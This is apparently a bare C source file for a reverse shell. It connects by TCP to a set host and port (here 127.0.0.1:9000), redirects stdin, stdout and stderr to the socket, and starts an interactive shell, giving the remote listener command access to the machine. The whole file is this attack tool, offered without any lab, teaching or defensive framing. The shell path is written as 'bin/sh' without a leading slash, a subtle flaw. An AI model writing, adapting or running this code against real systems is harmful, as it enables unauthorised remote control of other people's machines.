#include <stdio.h>
#include <stdlib.h>

#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PORT 9000
#define HOST "127.0.0.1"

int client_init(char *ip, int port){
	int i;
	struct sockaddr_in serv;

	if((i= socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("Socket:");
		exit(EXIT_FAILURE);
	}
	
	serv.sin_family = AF_INET;
	serv.sin_port = htons(port);
	serv.sin_addr.s_addr = inet_addr(ip);

	if(connect(i, (struct sockaddr *) &serv, sizeof(serv)) < 0){
		perror("Connect:");
		exit(EXIT_FAILURE);
	}

	return i;
}

int start_shell(int i){
	char *name[3];

	dup2(i, 0);
	dup2(i, 1);
	dup2(i, 2);

	name[0] = "bin/sh";
	name[1] = "-i";
	name[2] = NULL;
	execv(name[0], name);

	exit(1);

	return 0;
}


int main(){

	start_shell(client_init(HOST, PORT));
	
	return 0;
}
